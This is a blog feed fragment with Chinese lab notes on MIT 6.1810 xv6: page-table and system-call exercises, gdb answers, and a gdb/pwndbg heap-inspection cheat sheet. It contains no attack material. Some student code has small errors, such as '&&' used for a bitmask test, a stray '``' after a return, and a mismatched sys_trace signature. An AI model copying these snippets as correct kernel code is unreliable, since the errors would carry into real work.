class="keyword">if</span>(p-&gt;usyscall)</span><br><span class="line">    kfree((<span class="type">void</span>*)p-&gt;usyscall);</span><br><span class="line">  p-&gt;usyscall = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>在 <code>proc_freepagetable</code> 取消页面映射（这里实验文档没说，要自己发现在 <code>freeproc</code> 函数中调用了这个函数）</li></ol><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">proc_freepagetable</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 sz)</span></span><br><span class="line">&#123;</span><br><span class="line">  uvmunmap(pagetable, TRAMPOLINE, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  uvmunmap(pagetable, TRAPFRAME, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  uvmunmap(pagetable, USYSCALL, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  uvmfree(pagetable, sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提问：还有什么其他的系统调用可以通过这样的共享页来加快速度？</p><p>怎么感觉没有了</p><h2 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h2><p>xv6 使用三级页表，在运行第一个用户进程时打印出其页表</p><p>这里使用一个静态变量 level 表示在第几级页表</p><figure class="highlight c"><figcaption><span>kernel/vm.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">pteprint</span><span class="params">(<span class="type">pagetable_t</span> pagetable, <span class="type">int</span> level)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++) &#123;</span><br><span class="line">    <span class="type">pte_t</span> pte = pagetable[i];</span><br><span class="line">    <span class="keyword">if</span>(pte &amp; PTE_V) &#123;</span><br><span class="line">      uint64 child = PTE2PA(pte);</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; level; j++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; ..&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d: pte %p pa %p\n&quot;</span>, i, pte, child);</span><br><span class="line">      <span class="keyword">if</span>((pte &amp; (PTE_R | PTE_W | PTE_X)) == <span class="number">0</span>)</span><br><span class="line">        pteprint((<span class="type">pagetable_t</span>)child, level+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">vmprint</span><span class="params">(<span class="type">pagetable_t</span> pagetable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;page table %p\n&quot;</span>, pagetable);</span><br><span class="line">  pteprint(pagetable, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>笔者之前使用局部静态变量来判断 level，但是想着如果是多线程的话没有加锁可能会出问题</p><p>然后在 defs.h 和 exec.c 中添加声明和使用就行</p><h2 id="Detect-which-pages-have-been-accessed"><a href="#Detect-which-pages-have-been-accessed" class="headerlink" title="Detect which pages have been accessed"></a>Detect which pages have been accessed</h2><p>RISC-V 硬件会在 TLB 命中失败时，将对应 PTE 的 Access 标志位设 1，用来记录该页面有没有访问过</p><p>写一个系统调用，三个参数，检测的地址，检测的页数，bitmask</p><p>挺简单的，不知道为什么实验难度写着 hard</p><figure class="highlight c"><figcaption><span>kernel/sysproc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_A (1L &lt;&lt; 6)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">sys_pgaccess</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123; </span><br><span class="line">  uint64 base;</span><br><span class="line">  uint64 mask;</span><br><span class="line">  <span class="type">int</span> len;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> abits;</span><br><span class="line"></span><br><span class="line">  argaddr(<span class="number">0</span>, &amp;base);</span><br><span class="line">  argint(<span class="number">1</span>, &amp;len);</span><br><span class="line">  <span class="keyword">if</span>(len &gt; <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  argaddr(<span class="number">2</span>, &amp;mask);</span><br><span class="line"></span><br><span class="line">  abits = <span class="number">0</span>;</span><br><span class="line">  <span class="type">pagetable_t</span> pagetable = myproc()-&gt;pagetable;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    <span class="type">pte_t</span> *pte = walk(pagetable, base + PGSIZE * i, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(pte == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(*pte &amp; PTE_A) &#123;</span><br><span class="line">      abits |= <span class="number">1</span> &lt;&lt; i;</span><br><span class="line">      *pte &amp;= ~PTE_A;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(copyout(pagetable, mask, (<span class="type">char</span>*)&amp;abits, <span class="keyword">sizeof</span>(abits)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;``</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意检测完后，将标记置零，不然不知道检测后还没有访问过</p><h2 id="Optional-challenge-exercises"><a href="#Optional-challenge-exercises" class="headerlink" title="Optional challenge exercises"></a>Optional challenge exercises</h2><h3 id="使用-super-pages-减少页表中-PTE-的数量"><a href="#使用-super-pages-减少页表中-PTE-的数量" class="headerlink" title="使用 super-pages 减少页表中 PTE 的数量"></a>使用 super-pages 减少页表中 PTE 的数量</h3><p>不是很懂，改用更大的页（？）</p><h3 id="取消用户进程的第一页的映射，"><a href="#取消用户进程的第一页的映射，" class="headerlink" title="取消用户进程的第一页的映射，"></a>取消用户进程的第一页的映射，</h3><p>这样可以使引用空指针直接造成错误</p><p>需要修改 user.ld 文件，让进程的 text 段从 0x1000 开始，而不是 0</p><p>估计要改很多东西（uvmmap，uvmalloc啥的）。。。咕咕咕</p><h3 id="添加一个系统调用报告-dirty-pages（修改过的页表）"><a href="#添加一个系统调用报告-dirty-pages（修改过的页表）" class="headerlink" title="添加一个系统调用报告 dirty pages（修改过的页表）"></a>添加一个系统调用报告 dirty pages（修改过的页表）</h3><p>和第三个差不多，就不做了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;开学！&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022 Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022-Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Lab2 System Calls</title>
    <link href="https://humoooor.cn/2022/10/20/Lab2_System_calls/"/>
    <id>https://humoooor.cn/2022/10/20/Lab2_System_calls/</id>
    <published>2022-10-20T01:36:00.000Z</published>
    <updated>2024-01-04T04:30:02.106Z</updated>
    
    <content type="html"><![CDATA[<p>开学！</p><span id="more"></span><h2 id="实验开始前"><a href="#实验开始前" class="headerlink" title="实验开始前"></a>实验开始前</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git fetch</span><br><span class="line">git checkout syscall</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure><h2 id="使用-gdb"><a href="#使用-gdb" class="headerlink" title="使用 gdb"></a>使用 gdb</h2><ol><li>查看 backtrace 的输出，哪个函数调用了 syscall<ul><li><code>usertrap()</code></li><li>在 syscall 设置断点后，输入 <code>backtrace</code> 查看栈回溯</li></ul></li><li>p-&gt;trapframe-&gt;a7 的值是多少，值代表什么？<ul><li>7，代表系统调用号 SYS_exec</li><li><code>p/x *p-&gt;trapframe</code> 输出 p 的 trapframe 内容</li></ul></li><li>CPU 的上一个模式是什么？<ul><li>用户模式</li><li><code>p/x $sstatus</code> 输出 sstatus 寄存器的值，0x22</li><li>在 <code>kernel/riscv.h</code> 中有定义：<code>#define SSTATUS_SPP (1L &lt;&lt; 8)  // Previous mode, 1=Supervisor, 0=User</code>，也可以看给的文档</li><li>这里的 SPP 位为 0，因此上一个模式是用户模式</li></ul></li><li>令 <code>num = * (int *) 0;</code>，kernel 在哪条汇编指令 panic，哪个寄存器对应变量 num<ul><li><code>lw a3, 0(zero)</code>，a3</li><li>查看 panic 时 spec 寄存器的值指向哪个汇编</li></ul></li><li>为什么内核崩溃了？在内核地址空间 0 地址有映射吗？上面的 scause 值是否证实这一点？<ul><li>因为尝试读取 0 地址，它没有有效映射</li><li>寄存器 scause 表示发生 trap 的原因，这里的 scause 是 0xd，查看文档可以知道，0xd 表示 Load page fault，合理</li></ul></li><li>当内核 panic 时进程的名字是什么？进程 pid 是多少？<ul><li>“initcode”，1</li></ul></li></ol><p>一开始做因为寄存器的值不了解，还不太能看懂文档，没能理解，跳过了，有些答案是后面更新的</p><p>疑问</p><ul><li>访问到 0 地址时为什么会跳转到 kernelvec 中</li><li>scause、sepc、stval 的含义</li></ul><p>更新：访问 0 发生了 trap，需要跳转到处理内核 trap 的位置，即 <code>kerneltrap</code>，而在处理之前，先保存内核的状态，<code>kernelvec</code> 就是做这样的事情；scause 描述 trap 原因，sepc 保存发生 trap 时 pc 的值，stval 保存发生 trap 的值</p><h2 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h2><p>在 <code>user/trace.c</code> 已经写好了程序，只需要实现系统调用即可</p><ol><li>先在 <code>user/user.h</code> 加上原型，在 <code>user/usys.pl</code> 加上 stub（存根），在 <code>kernel/syscall.h</code> 加上系统调用号</li><li>在 <code>kernel.c</code> 的 proc 结构体加上一个新变量 trace_mask</li><li>在 <code>kernel/sysproc.c</code> 加上 <code>sys_trace</code>，设置当前进程的 track_mask</li></ol><figure class="highlight c"><figcaption><span>kernel/sysproc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_trace</span><span class="params">(<span class="type">int</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> mask;</span><br><span class="line"></span><br><span class="line">  argint(<span class="number">0</span>, &amp;mask);</span><br><span class="line">  <span class="keyword">if</span>(mask &lt; <span class="number">0</span>)</span><br><span class="line">    mask = <span class="number">0</span>;</span><br><span class="line">  myproc()-&gt;trace_mask = mask;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>修改 <code>kernel/proc.c</code> 的 <code>fork</code> 函数，将父进程的 tracemask 传给子进程</li></ol><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np-&gt;trace_mask = p-&gt;trace_mask;</span><br></pre></td></tr></table></figure><ol start="5"><li>修改 <code>kernel/syscall.c</code> 的 <code>syscall</code> 函数，如果是 trace_mask 对应的系统调用号，就打印出来（里面还要添加一个字符串数组 syscallNames）</li></ol><figure class="highlight c"><figcaption><span>kernel/syscall.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ret = syscalls[num]();</span><br><span class="line">p-&gt;trapframe-&gt;a0 = ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(p-&gt;tracemask &amp;&amp; <span class="number">1</span>&lt;&lt;num)</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>, p-&gt;pid, syscall_names[num], ret);</span><br></pre></td></tr></table></figure><p>一个很简单的系统调用，仅仅是获取系统调用参数，然后将参数传给 p-&gt;trace_mask，在 <code>syscall</code> 函数中检查输出调用的系统调用，就可以实现，但是能学到很多细节</p><h2 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h2><p>这里我们要使用 copyout，因为系统调用函数位处于内核模式，需要进程的页表和虚拟地址来查找用户进程中变量的物理位置（比如 sysinfo 结构体），然后将内核的数据复制给用户进程</p><figure class="highlight c"><figcaption><span>kernel/sysproc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sysinfo</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    uint64 si;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">info</span>;</span></span><br><span class="line"></span><br><span class="line">    argaddr(<span class="number">0</span>, &amp;si);</span><br><span class="line">    <span class="keyword">if</span>(!si) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    info.freemem = get_freemem();</span><br><span class="line">    info.nproc = get_nproc();</span><br><span class="line">    <span class="keyword">if</span>(copyout(myproc()-&gt;pagetable, si, (<span class="type">char</span>*)&amp;info, <span class="keyword">sizeof</span>(info)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写 get_freemem 时，观察 kalloc 函数，直接从 kmem.freelist 取一页内存返回，可以推测 kmem.freelist 包含所有可用的内存</p><figure class="highlight c"><figcaption><span>kernel/kalloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">get_freemem</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  uint64 n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(r = kmem.freelist; r; r = r-&gt;next) &#123;</span><br><span class="line">    n += <span class="number">4096</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写 ger_nproc 时，观察 procinit 函数，在 proc[NPROC] 数据中遍历初始化，且其中含 state 变量</p><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">get_nproc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  uint64 nproc = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state != UNUSED) &#123;</span><br><span class="line">      nproc++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nproc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记得在 sysproc.c 引入 sysinfo.h，在 defs.h 加上 get_freemem 和 get_nproc</p><h2 id="Optional-challenge-exercises"><a href="#Optional-challenge-exercises" class="headerlink" title="Optional challenge exercises"></a>Optional challenge exercises</h2><h3 id="打印出被追踪的系统调用的参数"><a href="#打印出被追踪的系统调用的参数" class="headerlink" title="打印出被追踪的系统调用的参数"></a>打印出被追踪的系统调用的参数</h3><p>每个系统调用参数个数记录在数组里，然后打印出来就好了</p><figure class="highlight c"><figcaption><span>kernel/syscall.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(p-&gt;trace_mask &amp; <span class="number">1</span>&lt;&lt;num) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>, p-&gt;pid, syscall_names[num], ret);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; syscall_args[num]; i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;arg%d: %p\n&quot;</span>, i+<span class="number">1</span>, argraw(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印出来是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ trace 32 grep hello README</span><br><span class="line">3: syscall read -&gt; 1023</span><br><span class="line">arg1: 0x00000000000003ff</span><br><span class="line">arg2: 0x0000000000001010</span><br><span class="line">arg3: 0x00000000000003ff</span><br><span class="line">3: syscall read -&gt; 961</span><br><span class="line">arg1: 0x00000000000003c1</span><br><span class="line">arg2: 0x000000000000104e</span><br><span class="line">arg3: 0x00000000000003c1</span><br><span class="line">3: syscall read -&gt; 321</span><br><span class="line">arg1: 0x0000000000000141</span><br><span class="line">arg3: 0x0000000000001037</span><br><span class="line">arg3: 0x00000000000003d8</span><br><span class="line">3: syscall read -&gt; 0</span><br><span class="line">arg1: 0x0000000000000000</span><br><span class="line">arg2: 0x0000000000001010</span><br><span class="line">arg3: 0x00000000000003ff</span><br></pre></td></tr></table></figure><h3 id="计算负载平均值并通过-sysinfo-导出"><a href="#计算负载平均值并通过-sysinfo-导出" class="headerlink" title="计算负载平均值并通过 sysinfo 导出"></a>计算负载平均值并通过 sysinfo 导出</h3><p>可以借用 Linux 的算法计算（懒）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;开学！&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022 Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022-Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Gdb 常用命令</title>
    <link href="https://humoooor.cn/2022/10/17/Gdb%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>https://humoooor.cn/2022/10/17/Gdb%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2022-10-17T12:10:00.000Z</published>
    <updated>2023-12-14T02:35:27.032Z</updated>
    
    <content type="html"><![CDATA[<p>pwndbg + pwngdb + angelheap</p><span id="more"></span><h2 id="Gdb-原生命令"><a href="#Gdb-原生命令" class="headerlink" title="Gdb 原生命令"></a>Gdb 原生命令</h2><ul><li>c = continue<ul><li>ctrl-c 取消</li></ul></li><li>ni = step 汇编级 n = step C语言级</li><li>si = stepi</li><li>b = break<ul><li>添加地址断点，当运行到端点会停下来</li><li>用 delete，disable，enable 修改断点</li></ul></li><li>watch<ul><li>添加变量断点</li><li>watch &lt;expression&gt; 当变量改变时会停下来</li><li>watch -l &lt;address&gt; 当地址指向的变量改变时会停下来</li><li>rwatch -l &lt;address&gt; 当地址指向的变量被读取时会停下来</li><li>watch var if xxx 添加条件</li></ul></li><li>x/&lt;n/f/u&gt; &lt;addr&gt;<ul><li>打印内存地址中的值</li><li>n 表示内存单元个数</li><li>f 表示输出格式<ul><li>i 汇编</li><li>t 二进制格式</li><li>o 八进制格式</li><li>d 十进制有符号整型</li><li>u 十进制无符号整型</li><li>x 十六进制，补齐前缀 0</li><li>a 十六进制，不补齐</li><li>f 浮点数</li><li>c 字符</li><li>s 字符串</li></ul></li><li>u 表示内存单元大小<ul><li>默认为机器字大小</li><li>b 表示单字节</li><li>h 表示双字节</li><li>w 表示四字节</li><li>g 表示八字节</li></ul></li></ul></li><li>p/&lt;n/f/u&gt; = print<ul><li>打印</li><li>p *(struct elfhdr*) 0x10000</li><li>p *argv@argc<ul><li>打印参数</li></ul></li></ul></li><li>info<ul><li>info registers<ul><li>查看寄存器</li></ul></li><li>info frame<ul><li>查看当前栈帧信息</li></ul></li><li>info breakpoints<ul><li>查看断点</li></ul></li><li>info locals<ul><li>查看本地变量</li></ul></li><li>info args<ul><li>查看函数参数</li></ul></li></ul></li><li>frame &lt;n&gt;<ul><li>跳转到上层栈帧，配合 i frame 使用</li></ul></li><li>list &lt;location&gt;<ul><li>打印地址对应的函数的源代码</li></ul></li><li>bt = backtrace<ul><li>查看所有栈帧信息</li></ul></li><li>layout split<ul><li>进入分离模式，可以查看当前运行的源码和反汇编</li><li>Ctrl+x, a 退出 layout 模式</li></ul></li><li>up &amp; down<ul><li>进入上 &amp; 下一级函数</li></ul></li><li>set<ul><li>修改变量或寄存器的值</li><li>set var $pc=0x3ffffff000</li></ul></li></ul><h3 id="回溯调试"><a href="#回溯调试" class="headerlink" title="回溯调试"></a>回溯调试</h3><ul><li>record<ul><li>开始记录进程状态</li></ul></li><li>reverse-*<ul><li>加上一些常用的命令，可实现反向运行</li><li>如 reverse-nexti，reverse-finish</li></ul></li></ul><h2 id="Pwndbg"><a href="#Pwndbg" class="headerlink" title="Pwndbg"></a>Pwndbg</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">parseheap</span><br><span class="line"><span class="comment"># 查看堆中使用情况</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr             prev             size              status           fd             bk</span><br><span class="line">0x603000         0x0              0x290             Used             None           None</span><br><span class="line">0x603290         0x0              0x20              Used             None           None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bins</span><br><span class="line"><span class="comment"># 查看 bin 中情况</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  1]: 0x6032c0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line">vis</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Angelheap"><a href="#Angelheap" class="headerlink" title="Angelheap"></a>Angelheap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">chunkinfo + chunkheader address</span><br><span class="line"></span><br><span class="line">pwndbg&gt; chunkinfo 0x603000</span><br><span class="line">==================================</span><br><span class="line">            Chunk info            </span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : 0x0</span><br><span class="line">size : 0x290</span><br><span class="line">prev_inused : 1</span><br><span class="line">is_mmap : 0</span><br><span class="line">non_mainarea : 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunkptr + chunkdata address</span><br><span class="line"></span><br><span class="line">pwndbg&gt; chunkptr 0x603010</span><br><span class="line">==================================</span><br><span class="line">            Chunk info            </span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : 0x0</span><br><span class="line">size : 0x290</span><br><span class="line">prev_inused : 1</span><br><span class="line">is_mmap : 0</span><br><span class="line">non_mainarea : 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heapinfo</span><br><span class="line">查看堆的情况</span><br><span class="line"></span><br><span class="line">pwndbg&gt; heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)    